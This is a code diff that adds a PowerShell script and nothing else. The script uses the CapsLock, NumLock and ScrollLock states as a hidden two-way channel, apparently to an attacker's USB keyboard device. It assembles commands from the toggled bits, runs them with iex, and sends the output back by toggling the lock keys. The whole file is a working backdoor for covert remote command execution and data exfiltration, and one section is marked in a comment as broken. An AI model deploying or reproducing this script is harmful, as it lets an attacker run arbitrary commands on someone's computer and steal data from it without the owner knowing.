@@ -1,0 +1,76 @@
+[void] [System.Reflection.Assembly]::LoadWithPartialName("'System.Windows.Forms")
+$kb = New-Object -ComObject WScript.Shell 
+$stp=0
+$cmd=""
+while (1) {
+
+  $lc = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
+  $ln = [System.Windows.Forms.Control]::IsKeyLocked('NumLock')
+  $ls = [System.Windows.Forms.Control]::IsKeyLocked('Scroll')
+
+  $d = 0
+  $dc = 0
+  # Read loop
+  while (1) {
+    $c = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
+    $n = [System.Windows.Forms.Control]::IsKeyLocked('NumLock')
+    $s = [System.Windows.Forms.Control]::IsKeyLocked('Scroll')
+    if (-not $lc -eq $c) {
+      $lc = $c
+      $d/=2
+      $d+=128
+      $dc+=1
+    }
+    if (-not $ln -eq $n) {
+      $ln = $n
+      $d/=2
+      $dc+=1
+    }
+    if ((-not $ls -eq $s) -or $dc -ge 8) { break }
+  }
+  # If we got all 8 bits, we need to wait for a scroll-lock here
+  #$ls = [System.Windows.Forms.Control]::IsKeyLocked('Scroll')
+  #while($dc -eq 8) {
+  #  $s = [System.Windows.Forms.Control]::IsKeyLocked('Scroll')
+  #  if (-not $ls -eq $s) { break }
+  #}
+  # But this seems to be broken... Just wait for a while...should work.
+
+  Start-Sleep -m 100
+
+  # Skip this unless we got all 8 bits
+  if ($dc -eq 8) {
+    # If we got a newline, run the command
+    if ($d -eq 10 -or $d -eq 13) {
+      # Run command
+      $st=([text.encoding]::ASCII).GetBytes((iex $cmd))
+      $stp=0
+      $cmd=""
+    } else {
+      $cmd+=[char]$d
+    }
+  }
+
+  #write-host $cmd
+
+  Start-Sleep -m 50
+
+  # Write a byte (if we have any)
+  if ($stp -le $st.length -and $st.length -gt 0) {
+    $e=$st[$stp++]
+    for($i=0;$i -lt 8;$i++) {
+      if($e%2 -eq 1) {
+        $kb.SendKeys("{CAPSLOCK}")
+        [System.Windows.Forms.SendKeys]::SendWait(" ")
+      }else{
+        $kb.SendKeys("{NUMLOCK}")
+        [System.Windows.Forms.SendKeys]::SendWait(" ")
+      }
+      $e=[math]::floor($e/2)
+      Start-Sleep -m 25
+    }
+  }
+  # Hand over
+  $kb.SendKeys("{SCROLLLOCK}")
+  [System.Windows.Forms.SendKeys]::SendWait(" ")
+}
